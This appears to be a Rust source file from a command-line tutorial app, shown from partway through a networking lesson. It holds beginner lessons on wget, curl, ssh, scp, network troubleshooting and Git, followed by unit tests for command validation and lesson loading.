                    content: "'wget' downloads files from the web.\n\nBasic usage:\n  wget https://example.com/file.zip\n  wget -O custom.zip https://example.com/file.zip\n  wget -c https://example.com/bigfile.iso  (resume download)\n\nUseful flags:\n  -O filename      Save as specific name\n  -c               Continue/resume partial download\n  -b               Background download\n  -q               Quiet mode\n  -r               Recursive (download entire site)\n  --limit-rate=1M  Limit download speed\n\nMultiple files:\n  wget -i urls.txt   Download all URLs in file\n\ncurl vs wget:\n  wget:\n    • Simpler for downloading files\n    • Better for recursive downloads\n    • Resume broken downloads\n    • Download in background\n\n  curl:\n    • More versatile (uploads, APIs)\n    • Better for testing/debugging\n    • Pipe output to other commands\n    • More protocol support\n\nRule of thumb:\n  • Downloading files? → wget\n  • API requests? → curl\n  • Both work for simple downloads!".to_string(),
                },
            },
            LessonStep {
                step_number: 8,
                title: "Introduction to SSH".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "SSH (Secure Shell) - Remote server access\n\nBasic syntax:\n  ssh username@hostname\n  ssh user@192.168.1.100\n  ssh user@example.com\n\nExamples:\n  ssh root@myserver.com\n  ssh pi@192.168.1.50         Raspberry Pi\n  ssh -p 2222 user@server     Custom port\n\nFirst connection:\n  • You'll see a fingerprint warning (type 'yes')\n  • Enter password when prompted\n  • You're now on the remote machine!\n  • Everything you type runs on the remote server\n  • Type 'exit' or Ctrl+D to disconnect\n\nUseful flags:\n  -p port        Custom port (default: 22)\n  -i keyfile     Use SSH key for authentication\n  -X             Enable X11 forwarding (GUI apps)\n  -L             Port forwarding\n  -v             Verbose (debugging)\n\nSSH keys (advanced):\n  ssh-keygen                 Generate key pair\n  ssh-copy-id user@host      Copy public key to server\n  ssh user@host              Now login without password!".to_string(),
                },
            },
            LessonStep {
                step_number: 9,
                title: "Quiz: SSH Usage".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "What does 'ssh user@192.168.1.100' do?".to_string(),
                    options: vec![
                        "Downloads files from 192.168.1.100".to_string(),
                        "Tests network connectivity to 192.168.1.100".to_string(),
                        "Opens a secure remote terminal session on 192.168.1.100 as 'user'".to_string(),
                        "Transfers files securely to 192.168.1.100".to_string(),
                    ],
                    correct_index: 2,
                    explanation: "Correct! SSH creates an encrypted terminal connection to the remote machine. You can then run commands as if you were sitting at that computer. It's like remote desktop but for the command line. For file transfers, you'd use 'scp' or 'rsync'. For connectivity testing, use 'ping'.".to_string(),
                },
            },
            LessonStep {
                step_number: 10,
                title: "Copying Files with scp".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "'scp' (secure copy) transfers files over SSH.\n\nSyntax:\n  scp source destination\n\nUpload to remote:\n  scp file.txt user@host:/path/\n  scp -r folder/ user@host:/path/    (recursive, for directories)\n\nDownload from remote:\n  scp user@host:/path/file.txt ./\n  scp user@host:/path/file.txt local-name.txt\n\nExamples:\n  scp report.pdf alice@server.com:~/documents/\n  scp alice@server.com:~/backup.tar.gz ./\n  scp -r photos/ alice@server.com:~/Pictures/\n  scp -P 2222 file.txt user@host:/tmp/    (custom port)\n\nUseful flags:\n  -r             Recursive (copy directories)\n  -P port        Custom SSH port\n  -i keyfile     Use specific SSH key\n  -C             Compress during transfer\n  -v             Verbose output\n\nAlternatives:\n  rsync          Better for large/many files (resumes, incremental)\n  sftp           Interactive file transfer (like FTP but secure)".to_string(),
                },
            },
            LessonStep {
                step_number: 11,
                title: "Network Troubleshooting".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Common network troubleshooting workflow:\n\n1. Check local network:\n   ping 127.0.0.1              Am I working? (localhost)\n   ping 192.168.1.1            Can I reach router?\n\n2. Check internet connectivity:\n   ping 8.8.8.8                Can I reach Google DNS? (tests connection)\n   ping google.com             Can I reach by name? (tests DNS)\n\n3. Check specific service:\n   ping example.com            Is host reachable?\n   curl -I https://example.com Is web server responding?\n   ssh user@example.com        Can I connect via SSH?\n\n4. Check DNS:\n   nslookup example.com        What's the IP address?\n   host example.com            Alternative DNS lookup\n\n5. Check open ports:\n   nc -zv example.com 80       Is port 80 open?\n   telnet example.com 22       Is SSH port responding?\n\nCommon issues:\n  • ping works, web doesn't → Firewall or web server issue\n  • IP works, domain doesn't → DNS problem\n  • Everything fails → Check physical connection, router, ISP".to_string(),
                },
            },
            LessonStep {
                step_number: 12,
                title: "Completion: Network Basics Mastered!".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Excellent work! You've learned essential networking!\n\nKey commands:\n  ping -c 4 host              Test connectivity\n  curl https://url            Fetch web content\n  curl -O https://url/file    Download file\n  wget https://url/file       Download file\n  wget -c url                 Resume download\n\nRemote access:\n  ssh user@host               Remote terminal\n  ssh -p port user@host       Custom SSH port\n  scp file user@host:/path    Upload file\n  scp user@host:/path/file .  Download file\n  scp -r dir user@host:/path  Upload directory\n\nTroubleshooting:\n  ping 8.8.8.8                Test internet\n  ping google.com             Test DNS\n  curl -I https://site.com    Test web server\n  nslookup domain             Check DNS\n\nQuick reference:\n  • No internet? → ping 8.8.8.8\n  • DNS issues? → ping IP works but domain doesn't\n  • Download file? → wget or curl -O\n  • Access server? → ssh user@host\n  • Transfer files? → scp\n\nNext: Learn Git fundamentals!".to_string(),
                },
            },
        ],
    }
}

/// Create the "Git Fundamentals" lesson
fn create_git_fundamentals_lesson() -> Lesson {
    Lesson {
        id: "git-fundamentals".to_string(),
        title: "Git Fundamentals".to_string(),
        description: "Master version control with Git: init, clone, add, commit, push, pull, status, log, and diff commands.".to_string(),
        difficulty: Difficulty::Beginner,
        estimated_minutes: 15,
        prerequisites: vec!["nav-basics".to_string(), "file-mgmt".to_string()],
        tags: vec!["beginner".to_string(), "git".to_string(), "version-control".to_string()],
        setup: vec![],
        steps: vec![
            LessonStep {
                step_number: 1,
                title: "What is Git?".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Welcome to Git Fundamentals!\n\nGit is a version control system - like 'Track Changes' for code.\n\nWhy use Git?\n  • Track every change to your code\n  • Collaborate with others without conflicts\n  • Experiment safely (branches)\n  • Roll back mistakes\n  • See who changed what and when\n  • Backup your work (via GitHub, GitLab, etc.)\n\nKey concepts:\n  • Repository (repo): Project folder tracked by Git\n  • Commit: Snapshot of your code at a point in time\n  • Branch: Parallel version of your code\n  • Remote: Server hosting your repo (GitHub, etc.)\n  • Clone: Download a copy of a repository\n  • Push: Upload your changes\n  • Pull: Download others' changes\n\nGit is essential for:\n  • Professional development\n  • Open source contribution\n  • Portfolio building\n  • Team collaboration".to_string(),
                },
            },
            LessonStep {
                step_number: 2,
                title: "Initializing a Repository".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Starting a new Git project:\n\nCommand:\n  git init\n\nWhat it does:\n  • Creates a .git folder (hidden directory)\n  • This folder stores all version history\n  • Turns current directory into a Git repository\n\nWorkflow:\n  mkdir my-project\n  cd my-project\n  git init\n  # Now you have a Git repository!\n\nYou'll see:\n  'Initialized empty Git repository in /path/to/my-project/.git/'\n\nThe .git folder contains:\n  • All commits\n  • Branch information\n  • Configuration\n  • History\n\nIMPORTANT:\n  • Don't delete .git folder (you'll lose all history!)\n  • Don't manually edit files in .git/\n  • One .git per project (not per subfolder)\n\nAlternative: Clone existing repository\n  git clone https://github.com/user/repo.git".to_string(),
                },
            },
            LessonStep {
                step_number: 3,
                title: "Checking Repository Status".to_string(),
                instruction: "The most important Git command is 'git status'. It shows what's changed. Try it: git status".to_string(),
                hint: Some("Type: git status".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "git status".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Perfect! 'git status' is your best friend. Run it constantly to see:\n  • Which files changed\n  • Which changes are staged for commit\n  • Which branch you're on\n  • If you're ahead/behind remote\n\nMake it a habit to run 'git status' before every commit!".to_string(),
                },
            },
            LessonStep {
                step_number: 4,
                title: "Understanding Git Workflow".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "The Git workflow has three stages:\n\n1. WORKING DIRECTORY (modified files)\n   ↓\n   git add (stage changes)\n   ↓\n2. STAGING AREA (files ready to commit)\n   ↓\n   git commit (save snapshot)\n   ↓\n3. REPOSITORY (committed history)\n   ↓\n   git push (upload to remote)\n   ↓\n4. REMOTE (GitHub, GitLab, etc.)\n\nThink of it like:\n  • Working Directory = Your desk (working on documents)\n  • Staging Area = Box for mail (selecting what to send)\n  • Repository = Filing cabinet (permanent storage)\n  • Remote = Cloud backup\n\nCommands:\n  git status           See what's changed\n  git add file.txt     Stage specific file\n  git add .            Stage all changes\n  git commit -m 'msg'  Save snapshot with message\n  git push             Upload to remote\n  git pull             Download from remote".to_string(),
                },
            },
            LessonStep {
                step_number: 5,
                title: "Staging Changes with git add".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "'git add' stages files for commit.\n\nCommands:\n  git add file.txt         Stage one file\n  git add file1 file2      Stage multiple files\n  git add .                Stage all changes in current directory\n  git add -A               Stage ALL changes everywhere\n  git add *.js             Stage all .js files\n  git add -p               Interactive staging (review each change)\n\nWhat 'staging' means:\n  • You're selecting which changes to include in next commit\n  • Lets you commit logical chunks, not everything at once\n  • Like packing a box - choose what goes in\n\nExample workflow:\n  # Edit multiple files\n  git status              # See what changed\n  git add feature.js      # Stage only the feature\n  git status              # Verify what's staged\n  git commit -m 'Add feature'\n  # Later...\n  git add bugfix.js       # Stage the bugfix separately\n  git commit -m 'Fix bug'\n\nWhy stage separately?\n  • Clean, focused commit history\n  • Easier to review changes\n  • Easier to revert specific features".to_string(),
                },
            },
            LessonStep {
                step_number: 6,
                title: "Quiz: Understanding git add".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "What does 'git add .' do?".to_string(),
                    options: vec![
                        "Commits all changes immediately".to_string(),
                        "Stages all changes in the current directory and subdirectories".to_string(),
                        "Deletes all unstaged files".to_string(),
                        "Pushes changes to remote repository".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! 'git add .' stages all new, modified, and deleted files in the current directory and all subdirectories. The dot (.) means 'current directory and everything under it'. This DOES NOT commit anything yet - you still need 'git commit' to save the snapshot. It's like putting documents in a box before mailing them.".to_string(),
                },
            },
            LessonStep {
                step_number: 7,
                title: "Committing Changes".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "'git commit' saves a snapshot of staged changes.\n\nBasic usage:\n  git commit -m \"Commit message\"\n  git commit -m \"Add user login feature\"\n\nLonger messages:\n  git commit\n  # Opens editor for multi-line message\n  # First line: summary (50 chars or less)\n  # Blank line\n  # Detailed explanation\n\nCommit message best practices:\n  ✓ Use present tense: \"Add feature\" not \"Added feature\"\n  ✓ Be specific: \"Fix login validation bug\" not \"Fix bug\"\n  ✓ Keep first line under 50 characters\n  ✓ Explain WHY, not just WHAT\n\nGood examples:\n  \"Add password reset functionality\"\n  \"Fix memory leak in image processor\"\n  \"Update dependencies to patch security issue\"\n\nBad examples:\n  \"stuff\" \"wip\" \"fixed it\" \"asdfasdf\" \"changes\"\n\nUseful flags:\n  git commit -m \"message\"    Quick commit\n  git commit -a -m \"msg\"     Stage + commit modified files (not new files)\n  git commit --amend         Fix last commit message".to_string(),
                },
            },
            LessonStep {
                step_number: 8,
                title: "Viewing Commit History".to_string(),
                instruction: "The 'git log' command shows commit history. Try it: git log".to_string(),
                hint: Some("Type: git log (press 'q' to exit)".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "git log".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Great! git log shows:\n  • Commit hash (unique ID)\n  • Author\n  • Date\n  • Commit message\n\nUseful variations:\n  git log --oneline          Compact view\n  git log --graph            Show branch graph\n  git log -n 5               Last 5 commits\n  git log --author='Alice'   Commits by Alice\n  git log file.txt           History of specific file".to_string(),
                },
            },
            LessonStep {
                step_number: 9,
                title: "Viewing Changes with git diff".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "'git diff' shows what changed.\n\nUsage:\n  git diff                  Changes not yet staged\n  git diff --staged         Changes that are staged\n  git diff HEAD             All changes (staged + unstaged)\n  git diff branch1 branch2  Compare branches\n  git diff commit1 commit2  Compare commits\n  git diff file.txt         Changes in specific file\n\nReading diff output:\n  --- a/file.txt      Original file\n  +++ b/file.txt      Modified file\n  @@ -10,7 +10,7 @@  Line numbers\n  -old line           Line removed (red)\n  +new line           Line added (green)\n   unchanged          Context line\n\nPractical uses:\n  • Before staging: Review what you're about to add\n  • Before committing: Double-check staged changes\n  • Code review: See what changed in a commit\n  • Debugging: When did this line change?\n\nWorkflow:\n  # Make changes\n  git diff              # Review changes\n  git add file.txt\n  git diff --staged     # Review what's staged\n  git commit -m \"msg\"".to_string(),
                },
            },
            LessonStep {
                step_number: 10,
                title: "Cloning Repositories".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "'git clone' downloads a repository.\n\nUsage:\n  git clone https://github.com/user/repo.git\n  git clone https://github.com/user/repo.git my-folder\n  git clone git@github.com:user/repo.git  (SSH)\n\nWhat happens:\n  1. Creates a new folder with repo name\n  2. Downloads all files and history\n  3. Sets up remote connection to origin\n  4. Checks out the default branch (usually 'main')\n\nExamples:\n  git clone https://github.com/torvalds/linux.git\n  git clone https://github.com/microsoft/vscode.git\n\nAfter cloning:\n  cd repo-name\n  git status           # Check status\n  git log              # See history\n  git remote -v        # See remote URLs\n\nHTTPS vs SSH:\n  • HTTPS: Easy setup, requires password/token each time\n  • SSH: Requires setup, but no password needed\n\nWhere to clone from?\n  • GitHub (most popular)\n  • GitLab\n  • Bitbucket\n  • Self-hosted servers".to_string(),
                },
            },
            LessonStep {
                step_number: 11,
                title: "Pushing and Pulling Changes".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Syncing with remote repositories:\n\ngit push - Upload your commits:\n  git push                    Push current branch\n  git push origin main        Push 'main' to 'origin'\n  git push -u origin branch   Set upstream and push\n\ngit pull - Download and merge changes:\n  git pull                    Pull current branch\n  git pull origin main        Pull from specific branch\n\nWorkflow:\n  # Make changes locally\n  git add .\n  git commit -m \"Add feature\"\n  git pull    # Get latest changes from team\n  git push    # Upload your changes\n\nIMPORTANT:\n  • Always pull before push (get latest changes first)\n  • Pull before starting work each day\n  • Push frequently (don't hoard commits)\n\nHandling conflicts:\n  # If pull shows conflicts\n  git status               # See conflicting files\n  # Edit files to resolve conflicts\n  git add .\n  git commit -m \"Merge conflicts\"\n  git push\n\nOrigin:\n  'origin' is the default name for the remote repository\n  git remote -v shows all remotes".to_string(),
                },
            },
            LessonStep {
                step_number: 12,
                title: "Quiz: Git Workflow".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "What's the correct order to save and upload changes?".to_string(),
                    options: vec![
                        "git commit → git add → git push".to_string(),
                        "git add → git commit → git push".to_string(),
                        "git push → git commit → git add".to_string(),
                        "git add → git push → git commit".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! The workflow is:\n  1. git add (stage changes)\n  2. git commit (save snapshot locally)\n  3. git push (upload to remote)\n\nThink of it as:\n  1. Pack the box (add)\n  2. Seal and label the box (commit)\n  3. Mail the box (push)\n\nYou can't commit unstaged changes, and you can't push uncommitted changes!".to_string(),
                },
            },
            LessonStep {
                step_number: 13,
                title: "Essential Git Commands Summary".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Git command quick reference:\n\nSetup:\n  git init              Create new repository\n  git clone url         Download repository\n\nBasic workflow:\n  git status            Check status (run often!)\n  git add file          Stage file\n  git add .             Stage all changes\n  git commit -m \"msg\"   Save snapshot\n  git push              Upload to remote\n  git pull              Download from remote\n\nViewing:\n  git log               Commit history\n  git log --oneline     Compact history\n  git diff              Unstaged changes\n  git diff --staged     Staged changes\n\nConfiguration:\n  git config --global user.name \"Your Name\"\n  git config --global user.email \"you@example.com\"\n\nHelp:\n  git help command      Detailed help\n  git command --help    Same as above\n\nDaily workflow:\n  1. git pull           (get latest)\n  2. Make changes\n  3. git status         (check changes)\n  4. git add .          (stage)\n  5. git commit -m \"\"   (save)\n  6. git push           (upload)".to_string(),
                },
            },
            LessonStep {
                step_number: 14,
                title: "Completion: Git Fundamentals Mastered!".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Congratulations! You've learned Git fundamentals!\n\nKey concepts mastered:\n  • Repository: Version-tracked project\n  • Commit: Snapshot of your code\n  • Staging: Selecting changes to commit\n  • Remote: Server hosting your code\n\nEssential commands:\n  git init              Start new repo\n  git clone url         Copy existing repo\n  git status            Check status\n  git add .             Stage changes\n  git commit -m \"msg\"   Save snapshot\n  git log               View history\n  git diff              See changes\n  git push              Upload commits\n  git pull              Download commits\n\nGit workflow:\n  1. Make changes\n  2. git add (stage)\n  3. git commit (save)\n  4. git push (share)\n\nBest practices:\n  ✓ Commit often with clear messages\n  ✓ Pull before push\n  ✓ Run git status frequently\n  ✓ Review changes with git diff\n  ✓ Write meaningful commit messages\n\nNext steps:\n  • Learn branching and merging\n  • Explore GitHub/GitLab\n  • Practice with real projects\n  • Learn .gitignore\n\nYou're ready to version control like a pro!".to_string(),
                },
            },
        ],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_lesson_progress_new() {
        let progress = LessonProgress::new("test-lesson".to_string());
        assert_eq!(progress.lesson_id, "test-lesson");
        assert_eq!(progress.current_step, 1);
        assert!(!progress.is_completed());
    }

    #[test]
    fn test_lesson_progress_completion() {
        let mut progress = LessonProgress::new("test-lesson".to_string());
        progress.complete_step(1);
        progress.complete_step(2);
        progress.complete_step(3);

        assert_eq!(progress.completion_percentage(3), 100.0);
        assert_eq!(progress.completion_percentage(6), 50.0);
    }

    #[test]
    fn test_command_validation_exact() {
        let validator = LessonValidator::new();
        let result = validator.validate_command(
            "ls -la",
            "ls -la",
            &CommandValidation::Exact,
        );
        assert!(result.is_success());

        let result = validator.validate_command(
            "ls -l",
            "ls -la",
            &CommandValidation::Exact,
        );
        assert!(!result.is_success());
    }

    #[test]
    fn test_command_validation_command_only() {
        let validator = LessonValidator::new();
        let result = validator.validate_command(
            "ls -la /home",
            "ls",
            &CommandValidation::CommandOnly,
        );
        assert!(result.is_success());

        // Wrong command
        let result = validator.validate_command("cd /home", "ls", &CommandValidation::CommandOnly);
        assert!(!result.is_success());

        // Empty input
        let result = validator.validate_command("", "ls", &CommandValidation::CommandOnly);
        assert!(!result.is_success());
    }

    #[test]
    fn test_command_validation_exact_negative() {
        let validator = LessonValidator::new();
        let validation = CommandValidation::Exact;

        // Wrong command
        assert!(!validator.validate_command("pwd", "ls -la", &validation).is_success());
        // Wrong flags
        assert!(!validator.validate_command("ls -l", "ls -la", &validation).is_success());
        // Empty input
        assert!(!validator.validate_command("", "ls -la", &validation).is_success());
    }

    #[test]
    fn test_command_validation_command_and_flags() {
        let validator = LessonValidator::new();
        let validation = CommandValidation::CommandAndFlags;

        // Exact match
        assert!(validator
            .validate_command("ls -la /home", "ls -la /home", &validation)
            .is_success());

        // Flags are order-insensitive and combined short flags expand:
        // -la == -al == -l -a
        assert!(validator
            .validate_command("ls -al /home", "ls -la /home", &validation)
            .is_success());
        assert!(validator
            .validate_command("ls -l -a /home", "ls -la /home", &validation)
            .is_success());
        assert!(validator
            .validate_command("ls -a -l /home", "ls -l -a /home", &validation)
            .is_success());

        // Wrong command
        assert!(!validator
            .validate_command("dir -la /home", "ls -la /home", &validation)
            .is_success());

        // Wrong flags (missing / extra)
        assert!(!validator
            .validate_command("ls -l /home", "ls -la /home", &validation)
            .is_success());
        assert!(!validator
            .validate_command("ls -lah /home", "ls -la /home", &validation)
            .is_success());

        // Wrong positional args
        assert!(!validator
            .validate_command("ls -la /tmp", "ls -la /home", &validation)
            .is_success());

        // Empty input
        assert!(!validator.validate_command("", "ls -la /home", &validation).is_success());
    }

    #[test]
    fn test_command_validation_regex() {
        let validator = LessonValidator::new();
        let validation = CommandValidation::Regex("ps.*8080|lsof.*8080".to_string());

        // Matching input
        assert!(validator
            .validate_command("ps aux | grep 8080", "", &validation)
            .is_success());
        assert!(validator
            .validate_command("lsof -i :8080", "", &validation)
            .is_success());

        // Wrong command
        assert!(!validator.validate_command("ls -la", "", &validation).is_success());
        // Empty input
        assert!(!validator.validate_command("", "", &validation).is_success());

        // Invalid pattern must fail, not silently pass
        let bad = CommandValidation::Regex("(unclosed".to_string());
        assert!(!validator.validate_command("anything", "", &bad).is_success());
    }

    #[test]
    fn test_command_validation_any_of_negative() {
        let validator = LessonValidator::new();
        let validation = CommandValidation::AnyOf(vec!["cd".to_string(), "cd ~".to_string()]);

        assert!(validator.validate_command("cd ~", "cd", &validation).is_success());
        // Wrong command
        assert!(!validator.validate_command("pwd", "cd", &validation).is_success());
        // Wrong flags/args
        assert!(!validator.validate_command("cd /tmp", "cd", &validation).is_success());
        // Empty input
        assert!(!validator.validate_command("", "cd", &validation).is_success());
    }

    #[test]
    fn test_lesson_toml_round_trip() {
        let lesson = create_navigation_basics_lesson();

        let toml_text = lesson.to_toml().expect("Lesson should serialize to TOML");
        let restored = Lesson::from_toml(&toml_text).expect("TOML should parse back to Lesson");

        assert_eq!(restored.id, lesson.id);
        assert_eq!(restored.title, lesson.title);
        assert_eq!(restored.difficulty, lesson.difficulty);
        assert_eq!(restored.steps.len(), lesson.steps.len());
        assert_eq!(restored.prerequisites, lesson.prerequisites);
        assert_eq!(restored.tags, lesson.tags);
        assert_eq!(restored.setup, lesson.setup);
    }

    #[test]
    fn test_lesson_toml_without_setup_still_parses() {
        // Backward compat: lesson-pack TOML written before the `setup` field
        // existed must keep parsing (setup defaults to empty)
        let mut lesson = create_navigation_basics_lesson();
        lesson.setup.clear();
        let toml_text = lesson.to_toml().unwrap();
        assert!(
            !toml_text.contains("[[setup]]"),
            "empty setup should not serialize an array"
        );

        let restored = Lesson::from_toml(&toml_text).expect("legacy TOML should parse");
        assert!(restored.setup.is_empty());
    }

    #[test]
    fn test_lesson_toml_setup_round_trip() {
        let mut lesson = create_navigation_basics_lesson();
        lesson.setup = vec![SetupFile {
            path: "data/sample.txt".to_string(),
            contents: "hello\nworld\n".to_string(),
        }];

        let toml_text = lesson.to_toml().unwrap();
        assert!(toml_text.contains("[[setup]]"));

        let restored = Lesson::from_toml(&toml_text).unwrap();
        assert_eq!(restored.setup.len(), 1);
        assert_eq!(restored.setup[0].path, "data/sample.txt");
        assert_eq!(restored.setup[0].contents, "hello\nworld\n");
    }

    #[test]
    fn test_builtin_lessons_have_starter_files_where_needed() {
        let library = LessonLibrary::new();
        for id in ["file-viewing", "file-mgmt", "text-processing"] {
            let lesson = library.get(id).expect("built-in lesson should exist");
            assert!(
                !lesson.setup.is_empty(),
                "lesson '{}' should ship starter files",
                id
            );
            for file in &lesson.setup {
                assert!(!file.path.starts_with('/'), "setup path must be relative");
                assert!(!file.path.contains(".."), "setup path must not contain ..");
                assert!(!file.contents.is_empty(), "setup contents must not be empty");
            }
        }
    }

    #[test]
    fn test_library_load_from_dir() {
        let dir = std::env::temp_dir().join(format!(
            "arct-lesson-dir-test-{}",
            std::process::id()
        ));
        std::fs::create_dir_all(&dir).unwrap();

        // Write an example user lesson that overrides a built-in by id
        let mut custom = create_navigation_basics_lesson();
        custom.title = "Navigation Basics (User Override)".to_string();
        std::fs::write(dir.join("nav-basics.toml"), custom.to_toml().unwrap()).unwrap();

        // And a brand-new user lesson
        let mut extra = create_navigation_basics_lesson();
        extra.id = "user-extra".to_string();
        extra.title = "User Extra Lesson".to_string();
        std::fs::write(dir.join("user-extra.toml"), extra.to_toml().unwrap()).unwrap();

        // Non-TOML files are ignored
        std::fs::write(dir.join("notes.txt"), "not a lesson").unwrap();

        let mut library = LessonLibrary::new();
        let builtin_count = library.all().len();
        let loaded = library.load_from_dir(&dir).expect("load_from_dir should succeed");

        assert_eq!(loaded, 2);
        // Override replaces, new lesson adds
        assert_eq!(library.all().len(), builtin_count + 1);
        assert_eq!(
            library.get("nav-basics").unwrap().title,
            "Navigation Basics (User Override)"
        );
        assert_eq!(library.get("user-extra").unwrap().title, "User Extra Lesson");

        // Missing directory is not an error
        let mut fresh = LessonLibrary::new();
        assert_eq!(fresh.load_from_dir(&dir.join("does-not-exist")).unwrap(), 0);

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_library_order_is_stable_and_respects_prerequisites() {
        let library = LessonLibrary::new();
        let ids: Vec<&str> = library.all().iter().map(|l| l.id.as_str()).collect();
        assert_eq!(ids.first(), Some(&"nav-basics"));
        let other = LessonLibrary::new();
        let again: Vec<&str> = other.all().iter().map(|l| l.id.as_str()).collect();
        assert_eq!(ids, again, "order must not change between runs");
        for (i, lesson) in library.all().iter().enumerate() {
            for prereq in &lesson.prerequisites {
                let at = ids.iter().position(|id| id == prereq).expect("prereq exists");
                assert!(at < i, "{} must come after {}", lesson.id, prereq);
            }
        }
    }
}
